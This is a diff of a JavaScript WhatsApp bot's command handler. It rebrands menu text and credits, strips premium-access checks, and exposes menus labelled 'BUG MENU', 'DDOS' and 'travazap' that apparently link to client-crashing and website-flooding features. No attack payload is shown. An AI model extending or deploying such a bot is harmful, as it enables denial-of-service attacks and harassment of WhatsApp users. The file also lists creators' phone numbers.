+╭──(         𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸         )
+║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢\`\〽️
+│🎭 𝐍𝐚𝐦𝐞 : ${m.pushName}
 ║▬▭▬▭▬▭▬▭▬▭
-│🌸 𝐎𝐰𝐧𝐞𝐫 : ${author}
-║🌸 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : ᴄᴀʏᴡᴢᴢ\`\𐁘
-│🌸 𝐎𝐰𝐧 𝐍𝐨 : 083827666602
-║🌸 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
-│▬▭「 ᴄᴀʏᴡᴢᴢ ᴡᴀꜱ ʜᴇʀᴇ! 」▭▬
+│🎭 𝐎𝐰𝐧𝐞𝐫 : ${author}
+║🎭 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙋𝙖𝙠 𝙏𝙯𝙮 𝘿𝙚𝙫\`\𐁘
+│🎭 𝐎𝐰𝐧 𝐍𝐨 : 081991410940
+║🎭 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
+│▬▭「 𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 」▭▬
 ║
 │›› Setmenu
 ║›› Allmenu
 │›› Owner
 ║›› Zap
 │
-║› ᴄᴀʏᴡᴢᴢ ©Copyright
+║› 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨 ©Copyright
 ╰━━━━━━━━━━━━━━━━━━━⬣`
 				//Button Menu
 				const msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -2775,7 +3449,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 									"forwardingScore": 999,
 									"forwardedNewsletterMessageInfo": {
 										"newsletterJid": "120363298524333143@newsletter",
-										"newsletterName": "𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️",
+										"newsletterName": "𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉",
 										"serverMessageId": 1
 									}
 								},
@@ -2792,56 +3466,56 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 									"text": ""
 								},
 								"footer": {
-									"text": "             ぢ  "
+									"text": "            ⿻  ⌜ 𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢️ ⌟  ⿻"
 								},
 								"nativeFlowMessage": {
 									"buttons": [{
 										"name": "single_select",
 										"buttonParamsJson": `{
-                        "title": " MENU ぜ",
+                        "title": "𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸",
                         "sections": [
         {
-            "title": "ᴠᴏɪᴅ ᴄʀᴀᴄᴋ ʙʏ ᴄᴀʏᴡᴢᴢ🌸",
-            "highlight_label": "️🌸",
+            "title": "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️️",
+            "highlight_label": "️〽️️",
             "rows": [
                 {
-                    "header": "ᴀʟʟᴍᴇɴᴜ",
+                    "header": "𝐀𝐋𝐋 𝐌𝐄𝐍𝐔",
                     "title": "ᨒ",
                     "id": ".allmenu"
                 },
                 {
-                    "header": "ᴏᴡɴᴇʀ",
+                    "header": "𝐎𝐖𝐍𝐄𝐑",
                     "title": "𐁘",
                     "id": ".xowner"
                 }
             ]
         },
         {
-            "title": "ʙᴜɢ x ᴄᴀʏ ",
-            "highlight_label": "xxᴠɪᴘ",
+            "title": "𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉",
+            "highlight_label": "𝐗𝐗𝐕𝐈𝐏",
             "rows": [
                 {
-                    "header": "ʙᴜɢ x ᴄᴀʏ ぢ",
+                    "header": "𝐈𝐍𝐅𝐈͢𝐍𝐈𝐓𝐘 ☇ 𝐙𝐀𝚸",
                     "title": "ϟ",
                     "id": "travazap"
                 }
             ]
         },
         {
-            "highlight_label": "ᴠᴠɪᴘ",
+            "highlight_label": "𝐕𝐕𝐈𝐏",
             "rows": [
                 {
-                    "header": "ぜ",                   
+                    "header": "𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸",                   
                     "title": "››",
                     "id": "bugmenu"
                 }
             ]
         },
         {
-            "highlight_label": "ᴅᴅᴏꜱ",
+            "highlight_label": "𝐃𝐨𝐒",
             "rows": [
                 {
-                    "header": "お",                   
+                    "header": "𝐃𝐃𝐎𝐒",                   
                     "title": "›",
                     "id": "dosweb"
                 }
@@ -2851,7 +3525,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 }`
 									}, {
 										"name": "cta_url",
-										"buttonParamsJson": "{\"display_text\":\"ᴄᴀʏᴡᴢᴢ ɴɪʜ\",\"url\":\"https://youtube.com/@AkmalMods\",\"merchant_url\":\"https://youtube.com/@AkmalMods\"}"
+										"buttonParamsJson": "{\"display_text\":\"𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉\",\"url\":\"https://youtube.com/@PakTzy\",\"merchant_url\":\"https://youtube.com/@PakTzy\"}"
 									}]
 								}
 							}
@@ -2869,8 +3543,8 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 						externalAdReply: {
 							showAdAttribution: true,
 							renderLargerThumbnail: false,
-							title: `ᴄᴀʏᴡᴢᴢ ɴɪʜ`,
-							body: `ᴄᴀʏᴡᴢᴢ ɴɪʜ`,
+							title: `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`,
+							body: `𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽️`,
 							previewType: "VIDEO",
 							thumbnail: V1,
 							sourceUrl: ``,
@@ -2891,22 +3565,28 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 			break
 			//=================================================//
 			case "allmenu": {
-				if (!isPremium) return zreply(mess.premium)
 				let X1 = [TheZhiro, nulll, nulll2]
 				let randomIndex = Math.floor(Math.random() * X1.length)
 				let V1 = X1[randomIndex]
 				let itsmenu = `
-╭──(         げ          )
-║ᨒ ᴄᴀʏᴡᴢᴢ ɴɪʜ ぜ\`\
-│ 𝐍𝐚𝐦𝐞 : ${m.pushName}
+╭──(         𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸         )
+║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢\`\〽️
+│🎭 𝐍𝐚𝐦𝐞 : ${m.pushName}
 ║▬▭▬▭▬▭▬▭▬▭
-|| 🌸 𝐎𝐰𝐧𝐞𝐫 : ${author}
-║ 🌸 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : ᴄᴀʏᴡᴢᴢ ɴɪʜ お\`\𐁘
-│🌸 𝐎𝐰𝐧 𝐍𝐨 : -
-║🌸 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
-│▬▭「 ᴄᴀʏᴡᴢᴢ ɴɪʜぜ 」▭▬
-║› ᴄᴀʏᴡᴢ-ᴢ 🌿
+│🎭 𝐎𝐰𝐧𝐞𝐫 : ${author}
+║🎭 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙋𝙖𝙠 𝙏𝙯𝙮 𝘿𝙚𝙫\`\𐁘
+│🎭 𝐎𝐰𝐧 𝐍𝐨 : 081991410940
+║🎭 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
+│▬▭「 𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 」▭▬
+║› 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨 ©Copyright
 ╰━━━━━━━━━━━━━━━━━━━⬣
+
+╔─═⊱ *「 \`GITHUB ACCES\` 」* ─═⬣
+│┏⊱
+║⿻ Db
+│⿻ Cr
+║┗⊱
+┗━━━━━━━━━━━━━━━━━⬣
 
 ╔─═⊱ *「 \`OWNER CMD\` 」* ─═⬣
 │┏⊱
@@ -2926,7 +3606,6 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 │⿻ Autobio
 ║⿻ Setmenu
 │⿻ Setpp
-║⿻ Decrypt
 ║┗⊱
 ┗━━━━━━━━━━━━━━━━━⬣
 
@@ -2993,12 +3672,10 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 ┗━━━━━━━━━━━━━━━━⬣
 
 ┏━━⬣  Thanks To  友
-┃ 🔥 CAYWZZ\`
-┃ 🔥 The Zetsu Boxygen
-┃ 🔥 Aztecs
-┃ 🔥 SkyZet
-┃ 🔥 Kizyy
-┗━━⬣  げ
+┃ 🔥 The Getsuzo Zhiro </> Dev\`
+┃ 🔥 Ryo Devorsice
+┃ 🔥 KyuuRzy
+┗━━⬣  ⿻  ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨🐉 ⌟  ⿻
 `
 				const msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 					"viewOnceMessage": {
@@ -3010,7 +3687,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 									"forwardingScore": 999,
 									"forwardedNewsletterMessageInfo": {
 										"newsletterJid": "120363298524333143@newsletter",
-										"newsletterName": "𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️",
+										"newsletterName": "𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉",
 										"serverMessageId": 1
 									}
 								},
@@ -3027,12 +3704,12 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 									"text": ""
 								},
 								"footer": {
-									"text": "⿻  ⌜ 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ ⌟  ⿻"
+									"text": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻"
 								},
 								"nativeFlowMessage": {
 									"buttons": [{
 										"name": "quick_reply",
-										"buttonParamsJson": "{\"display_text\":\"𝐉𝐀𝐂𝐊 ☇ 𝐕𝟐\",\"id\":\".xowner\"}"
+										"buttonParamsJson": "{\"display_text\":\"𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸\",\"id\":\".xowner\"}"
 									}]
 								}
 							}
@@ -3050,8 +3727,8 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 						externalAdReply: {
 							showAdAttribution: true,
 							renderLargerThumbnail: false,
-							title: `𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`,
-							body: `𝐀𝐍𝐓𝐈 𝐌𝐀𝐑𝐆𝐀〽️`,
+							title: `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`,
+							body: `𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽️`,
 							previewType: "VIDEO",
 							thumbnail: TheZhiro,
 							sourceUrl: ``,
@@ -3072,21 +3749,20 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 			break
 			//=================================================//
 			case "dosweb": {
-				if (!isPremium) return zreply(mess.premium)
 				let X1 = [nulll, nulll2]
 				let randomIndex = Math.floor(Math.random() * X1.length)
 				let V1 = X1[randomIndex]
 				let itsmenu = `
-╭──(         𝐉𝐀𝐂𝐊 ☇ 𝐕𝟐          )
-║ᨒ 𝐀𝐍𝐓𝐈 𝐌𝐀𝐑𝐆𝐀\`\〽️
-│✨ 𝐍𝐚𝐦𝐞 : ${m.pushName}
+╭──(         𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸         )
+║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢\`\〽️
+│🎭 𝐍𝐚𝐦𝐞 : ${m.pushName}
 ║▬▭▬▭▬▭▬▭▬▭
-│✨ 𝐎𝐰𝐧𝐞𝐫 : ${author}
-║✨ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂\`\𐁘
-│✨ 𝐎𝐰𝐧 𝐍𝐨 : 083827666602
-║✨ 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
-│▬▭「 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ 」▭▬
-║› 𝐉𝐀𝐂𝐊𝐕𝟐 ©Copyright
+│🎭 𝐎𝐰𝐧𝐞𝐫 : ${author}
+║🎭 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙋𝙖𝙠 𝙏𝙯𝙮 𝘿𝙚𝙫\`\𐁘
+│🎭 𝐎𝐰𝐧 𝐍𝐨 : 081991410940
+║🎭 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
+│▬▭「 𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 」▭▬
+║› 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨 ©Copyright
 ╰━━━━━━━━━━━━━━━━━━━⬣
 
 ╔─═⊱ *「 \`DDOS\` 」* ─═⬣
@@ -3107,13 +3783,10 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 ┗━━━━━━━━━━━━━━━━━⬣
 
 ┏━━⬣  Thanks To  友
-┃ 🔥 AkmalMods </> Dev\`
-┃ 🔥 The Zetsu Boxygen
-┃ 🔥 Aztecs
-┃ 🔥 SkyZet
-┃ 🔥 Kizyy
-┃ 🔥 The Getsuzo Zhiro
-┗━━⬣  ⿻  ⌜ 𝐉𝐀𝐂𝐊𝐕𝟐〽️ ⌟  ⿻
+┃ 🔥 The Getsuzo Zhiro </> Dev\`
+┃ 🔥 Ryo Devorsice
+┃ 🔥 KyuuRzy
+┗━━⬣  ⿻  ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨🐉 ⌟  ⿻
 `
 				const msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 					"viewOnceMessage": {
@@ -3125,7 +3798,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 									"forwardingScore": 999,
 									"forwardedNewsletterMessageInfo": {
 										"newsletterJid": "120363298524333143@newsletter",
-										"newsletterName": "𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️",
+										"newsletterName": "𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉",
 										"serverMessageId": 1
 									}
 								},
@@ -3142,12 +3815,12 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 									"text": ""
 								},
 								"footer": {
-									"text": "⿻  ⌜ 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ ⌟  ⿻"
+									"text": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻"
 								},
 								"nativeFlowMessage": {
 									"buttons": [{
 										"name": "quick_reply",
-										"buttonParamsJson": "{\"display_text\":\"𝐉𝐀𝐂𝐊 ☇ 𝐕𝟐\",\"id\":\".xowner\"}"
+										"buttonParamsJson": "{\"display_text\":\"𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸\",\"id\":\".xowner\"}"
 									}]
 								}
 							}
@@ -3165,8 +3838,8 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 						externalAdReply: {
 							showAdAttribution: true,
 							renderLargerThumbnail: false,
-							title: `𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`,
-							body: `𝐀𝐍𝐓𝐈 𝐌𝐀𝐑𝐆𝐀〽️`,
+							title: `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`,
+							body: `𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽️`,
 							previewType: "VIDEO",
 							thumbnail: TheZhiro,
 							sourceUrl: ``,
@@ -3186,21 +3859,20 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 			}
 			break
 			case "bugmenu": {
-				if (!isPremium) return zreply(mess.premium)
 				let X1 = [nulll, nulll2]
 				let randomIndex = Math.floor(Math.random() * X1.length)
 				let V1 = X1[randomIndex]
 				let itsmenu = `
-╭──(         𝐉𝐀𝐂𝐊 ☇ 𝐕𝟐          )
-║ᨒ 𝐀𝐍𝐓𝐈 𝐌𝐀𝐑𝐆𝐀\`\〽️
-│✨ 𝐍𝐚𝐦𝐞 : ${m.pushName}
+╭──(         𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸         )
+║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢\`\〽️
+│🎭 𝐍𝐚𝐦𝐞 : ${m.pushName}
 ║▬▭▬▭▬▭▬▭▬▭
-│✨ 𝐎𝐰𝐧𝐞𝐫 : ${author}
-║✨ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂\`\𐁘
-│✨ 𝐎𝐰𝐧 𝐍𝐨 : 083827666602
-║✨ 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
-│▬▭「 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ 」▭▬
-║› 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂 ©Copyright
+│🎭 𝐎𝐰𝐧𝐞𝐫 : ${author}
+║🎭 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙋𝙖𝙠 𝙏𝙯𝙮 𝘿𝙚𝙫\`\𐁘
+│🎭 𝐎𝐰𝐧 𝐍𝐨 : 081991410940
+║🎭 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
+│▬▭「 𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 」▭▬
+║› 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨 ©Copyright
 ╰━━━━━━━━━━━━━━━━━━━⬣
 
 ╔─═⊱ *「 \`BUG MENU\` 」* ─═⬣
@@ -3219,13 +3891,10 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 ┗━━━━━━━━━━━━━━━━━⬣
 
 ┏━━⬣  Thanks To  友
-┃ 🔥 AkmalMods </> Dev\`
-┃ 🔥 The Zetsu Boxygen
-┃ 🔥 Aztecs
-┃ 🔥 SkyZet
-┃ 🔥 Kizyy
-┃ 🔥 The Getsuzo Zhiro
-┗━━⬣  ⿻  ⌜ 𝐉𝐀𝐂𝐊𝐕𝟐〽️ ⌟  ⿻
+┃ 🔥 The Getsuzo Zhiro </> Dev\`
+┃ 🔥 Ryo Devorsice
+┃ 🔥 KyuuRzy
+┗━━⬣  ⿻  ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨🐉 ⌟  ⿻
 `
 				const msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 					"viewOnceMessage": {
@@ -3237,7 +3906,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 									"forwardingScore": 999,
 									"forwardedNewsletterMessageInfo": {
 										"newsletterJid": "120363298524333143@newsletter",
-										"newsletterName": "𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️",
+										"newsletterName": "𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉",
 										"serverMessageId": 1
 									}
 								},
@@ -3254,12 +3923,12 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 									"text": ""
 								},
 								"footer": {
-									"text": "⿻  ⌜ 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ ⌟  ⿻"
+									"text": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻"
 								},
 								"nativeFlowMessage": {
 									"buttons": [{
 										"name": "quick_reply",
-										"buttonParamsJson": "{\"display_text\":\"𝐉𝐀𝐂𝐊 ☇ 𝐕𝟐\",\"id\":\".xowner\"}"
+										"buttonParamsJson": "{\"display_text\":\"𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸\",\"id\":\".xowner\"}"
 									}]
 								}
 							}
@@ -3277,8 +3946,8 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 						externalAdReply: {
 							showAdAttribution: true,
 							renderLargerThumbnail: false,
-							title: `𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`,
-							body: `𝐀𝐍𝐓𝐈 𝐌𝐀𝐑𝐆𝐀〽️`,
+							title: `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`,
+							body: `𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽️`,
 							previewType: "VIDEO",
 							thumbnail: TheZhiro,
 							sourceUrl: ``,
@@ -3305,12 +3974,11 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 			//=================================================//
 			case "owner":
 			case "xowner": {
-				if (!isPremium) return zreply(mess.premium)
-				let namaown = `𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ`
+				let namaown = `𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ`
 				var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 					"contactMessage": {
 						"displayName": `${namaown}`,
-						"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.ownMain}:+${global.ownMain}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️\nX-WA-BIZ-NAME: [[ ༑ 𝐙.𝐱.𝐕 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`,
+						"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.ownMain}:+${global.ownMain}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉\nX-WA-BIZ-NAME: [[ ༑ 𝐙.𝐱.𝐕 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`,
 					}
 				}), {
 					userJid: m.chat,
@@ -3323,7 +3991,6 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 			break
 			//=================================================//
 			case "setprefix":
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
 				if (text == "multi" || text == "1") {
 					if (db.data.settings[botNumber].setPrefix == "multi") return zreply("Sudah Active")
@@ -3341,7 +4008,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					VxoZap.sendButtons(m.chat, {
 						"body": "\`\`\`「 SETTINGS PREFIX BOT 」\`\`\`",
 						"title": "𝐎𝐏𝐓𝐈𝐎𝐍𝐒",
-						"footer": "⿻  ⌜ 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ ⌟  ⿻",
+						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
 						"sections": [{
 								"title": "MULTI",
 								"id": `${prefix + command} 1`
@@ -3364,7 +4031,6 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 				break
 				//=================================================//
 			case "autobutton":
-				
 				if (!isCreator) return zreply(mess.owner)
 				if (text == "on" || text == "1") {
 					if (db.data.settings[botNumber].autoButton == true) return zreply("Sudah Active")
@@ -3377,7 +4043,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 				} else if (db.data.settings[botNumber].autoButton) {
 					VxoZap.sendButtons(m.chat, {
 						"body": "\`\`\`「 MODE AUTO BUTTON 」\`\`\`",
-						"footer": "⿻  ⌜ 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ ⌟  ⿻",
+						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
 						"buttons": [{
 								"displayText": "𝐎𝐍𝐍",
 								"id": `${prefix + command} 1`
@@ -3396,7 +4062,6 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 				break
 				//=================================================//
 			case "setmenu":
-				
 				if (!isCreator) return zreply(mess.owner)
 				if (text == "button" || text == "1") {
 					if (db.data.settings[botNumber].menuType == "buttonImage") return zreply("Sudah Active")
@@ -3410,7 +4075,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					VxoZap.sendButtons(m.chat, {
 						"body": "\`\`\`「 SETTINGS MENU BOT 」\`\`\`",
 						"title": "𝐎𝐏𝐓𝐈𝐎𝐍𝐒",
-						"footer": "⿻  ⌜ 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ ⌟  ⿻",
+						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
 						"sections": [{
 								"title": "BUTTONS IMAGES",
 								"id": `${prefix + command} 1`
@@ -3429,7 +4094,6 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 				break
 				//=================================================//
 			case "autorecord":
-				
 				if (!isCreator) return zreply(mess.owner)
 				if (text == "on" || text == "1") {
 					if (db.data.settings[botNumber].autoRecord == true) return zreply("Sudah Active")
@@ -3442,7 +4106,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 				} else if (db.data.settings[botNumber].autoButton) {
 					VxoZap.sendButtons(m.chat, {
 						"body": "\`\`\`「 MODE AUTO RECORD 」\`\`\`",
-						"footer": "⿻  ⌜ 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ ⌟  ⿻",
+						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
 						"buttons": [{
 								"displayText": "ON",
 								"id": `${prefix + command} 1`
@@ -3461,7 +4125,6 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 				break
 				//=================================================//
 			case "autoread":
-				
 				if (!isCreator) return zreply(mess.owner)
 				if (text == "on" || text == "1") {
 					if (db.data.settings[botNumber].autoread == true) return zreply("Sudah Active")
@@ -3474,7 +4137,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 				} else if (db.data.settings[botNumber].autoButton) {
 					VxoZap.sendButtons(m.chat, {
 						"body": "\`\`\`「 MODE AUTO READ 」\`\`\`",
-						"footer": "⿻  ⌜ 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ ⌟  ⿻",
+						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
 						"buttons": [{
 								"displayText": "ON",
 								"id": `${prefix + command} 1`
@@ -3493,7 +4156,6 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 				break
 				//=================================================//
 			case "autotyping":
-				
 				if (!isCreator) return zreply(mess.owner)
 				if (text == "on" || text == "1") {
 					if (db.data.settings[botNumber].autoTyping == true) return zreply("Sudah Active")
@@ -3506,7 +4168,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 				} else if (db.data.settings[botNumber].autoButton) {
 					VxoZap.sendButtons(m.chat, {
 						"body": "\`\`\`「 MODE AUTO TYPING 」\`\`\`",
-						"footer": "⿻  ⌜ 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ ⌟  ⿻",
+						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
 						"buttons": [{
 								"displayText": "ON",
 								"id": `${prefix + command} 1`
@@ -3525,7 +4187,6 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 				break
 				//=================================================//
 			case "autobio":
-				
 				if (!isCreator) return zreply(mess.owner)
 				if (text == "on" || text == "1") {
 					if (db.data.settings[botNumber].autobio == true) return zreply("Sudah Active")
@@ -3538,7 +4199,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 				} else if (db.data.settings[botNumber].autoButton) {
